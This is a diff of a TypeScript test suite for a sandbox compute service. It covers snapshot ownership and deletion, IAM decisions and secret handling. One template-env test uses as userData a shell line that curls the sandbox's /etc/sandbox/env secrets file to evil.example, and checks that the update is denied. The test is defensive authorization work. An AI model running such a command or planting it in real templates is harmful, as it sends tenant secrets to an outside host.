@@ -56,6 +56,7 @@ interface Recorded {
     idempotencyKey: string;
   }[];
   decisions: string[];
+  fleetDecisions: number;
 }
 let recorded: Recorded;
 /** Actions the fake IAM refuses (the extra decisions vps makes). */
@@ -75,6 +76,7 @@ const fresh = (): Recorded => ({
   events: [],
   commands: [],
   decisions: [],
+  fleetDecisions: 0,
 });
 
 const alice: Caller = {
@@ -131,8 +133,13 @@ function moduleContext(sql: SqlExecutor): ModuleContext {
     desired: { async invalidate() {} },
     // IAM decisions vps adds itself (secrets:manage for templates that use secrets).
     iam: {
-      async require(_credential: unknown, decision: { action: string }) {
+      rootTenantId: 'root',
+      async require(
+        _credential: unknown,
+        decision: { action: string; resource: { type: string } },
+      ) {
         recorded.decisions.push(decision.action);
+        if (decision.resource.type === 'compute-fleet') recorded.fleetDecisions++;
         if (denied.has(decision.action)) throw new ComputeError('ACCESS_DENIED', 'Access denied');
       },
     },
@@ -1151,24 +1158,66 @@ describe('snapshots', () => {
       deleted: true,
     });
     expect(eventTypes()).toEqual(['sandbox.snapshot.deleted']);
+    await expect(
+      run(snapshots.get!, { tenantId: 'acme', snapshotId: kept.id }, alice),
+    ).rejects.toMatchObject({ code: 'NOT_FOUND' });
+    // Idempotent (its authz row stays until the purge); the object goes with the next pass,
+    // outside the request's transaction.
+    expect(await run(snapshots.delete!, { tenantId: 'acme', snapshotId: kept.id }, alice)).toEqual({
+      deleted: true,
+    });
+    expect(deletedObjects).toEqual([]);
+    expect(recorded.removed.some((row) => row.id === kept.id)).toBe(false);
+    await reconcileWith('all');
+    expect(deletedObjects).toEqual([kept.id]);
     expect(recorded.removed.at(-1)).toEqual({
       type: 'sandbox-snapshot',
       id: kept.id,
       tenantId: 'acme',
     });
     await expect(
-      run(snapshots.get!, { tenantId: 'acme', snapshotId: kept.id }, alice),
-    ).rejects.toMatchObject({ code: 'NOT_FOUND' });
-    // Idempotent; the object goes with the next pass, outside the request's transaction.
-    expect(await run(snapshots.delete!, { tenantId: 'acme', snapshotId: kept.id }, alice)).toEqual({
-      deleted: true,
-    });
-    expect(deletedObjects).toEqual([]);
-    await reconcileWith('all');
-    expect(deletedObjects).toEqual([kept.id]);
-    await expect(
       run(snapshots.delete!, { tenantId: 'globex', snapshotId: kept.id }, alice),
     ).rejects.toMatchObject({ code: 'NOT_FOUND' });
+  });
+
+  it("belong to the sandbox's owner, whoever took them, and outlive deletion while a restore needs them", async () => {
+    const { template, sandbox } = await running();
+    // Bob may snapshot alice's sandbox (sandboxes:update) but gets neither its memory nor a login.
+    const taken = (await callStore(
+      'snapshot',
+      { tenantId: 'acme', sandboxId: sandbox.id },
+      bob,
+    )) as SnapshotView & { ownerIdentityId: string };
+    expect(taken.ownerIdentityId).toBe('usr_alice');
+    expect(recorded.authz.findLast((row) => row.type === 'sandbox-snapshot')?.ownerId).toBe(
+      'usr_alice',
+    );
+    await settle(recorded.commands[0]!.id, 'succeeded');
+    await reconcileWith(taken.id);
+    await expect(
+      callStore(
+        'create',
+        { tenantId: 'acme', templateId: template.id, fromSnapshot: taken.id, idempotencyKey: 'x' },
+        bob,
+      ),
+    ).rejects.toMatchObject({ code: 'NOT_FOUND' });
+    const restored = (await callStore('create', {
+      tenantId: 'acme',
+      templateId: template.id,
+      fromSnapshot: taken.id,
+      idempotencyKey: 'mine',
+    })) as SandboxView;
+    // Deleting the snapshot while its restore lives keeps the object (a recreate downloads again).
+    deletedObjects.length = 0;
+    const snapshots = storeApi.sandboxSnapshots as unknown as Record<string, Definition>;
+    await run(snapshots.delete!, { tenantId: 'acme', snapshotId: taken.id }, alice);
+    await reconcileWith('all');
+    expect(deletedObjects).toEqual([]);
+    await call('sandboxes', 'delete', { tenantId: 'acme', sandboxId: restored.id });
+    await reconcileInstance(restored.instanceId);
+    await hostsReport('absent');
+    await reconcileWith('all');
+    expect(deletedObjects).toEqual([taken.id]);
   });
 
   it('keep a pending upload’s object until its command settles, then delete it', async () => {
@@ -1387,7 +1436,7 @@ describe('template env', () => {
     recorded.decisions = [];
     const template = await createTemplate({ env: { TOKEN: 'secret://acme/api-token' } });
     expect(recorded.decisions).toEqual(['compute:secrets:manage']);
-    // A template without secrets needs no extra decision.
+    // An update that only changes lifetimes needs no extra decision...
     recorded.decisions = [];
     await call('sandboxTemplates', 'update', {
       tenantId: 'acme',
@@ -1395,6 +1444,43 @@ describe('template env', () => {
       maxTtlSeconds: 7200,
     });
     expect(recorded.decisions).toEqual([]);
+    // ...but one that changes what runs next to the secrets does, though it names none itself.
+    denied.add('compute:secrets:manage');
+    await expect(
+      call('sandboxTemplates', 'update', {
+        tenantId: 'acme',
+        templateId: template.id,
+        userData: '#!/bin/sh\ncurl -d @/etc/sandbox/env https://evil.example\n',
+      }),
+    ).rejects.toMatchObject({ code: 'ACCESS_DENIED' });
+    await expect(
+      call('sandboxTemplates', 'update', {
+        tenantId: 'acme',
+        templateId: template.id,
+        imageId: 'ubuntu-24.04',
+      }),
+    ).rejects.toMatchObject({ code: 'ACCESS_DENIED' });
+  });
+
+  it('in the root tenant, also decides the fleet: its secrets share the namespace', async () => {
+    broker = {
+      resolve: async (ref) => `value:${ref}`,
+      put: async (tenantId) => `secret://${tenantId}/sealed`,
+      delete: async () => {},
+    };
+    await db.query(
+      `INSERT INTO secret_refs (ref, tenant_id, name, version, store, last_idempotency_key)
+       VALUES ('secret://root/token', 'root', 'token', 1, 'local', 'k')`,
+    );
+    recorded.decisions = [];
+    await call(
+      'sandboxTemplates',
+      'create',
+      templateInput({ tenantId: 'root', env: { TOKEN: 'secret://root/token' } }),
+      root,
+    );
+    expect(recorded.decisions).toEqual(['compute:secrets:manage', 'compute:secrets:manage']);
+    expect(recorded.fleetDecisions).toBe(1);
   });
 
   it("resolves the tenant's secrets into /etc/sandbox/env, sealed by the broker, never inline", async () => {
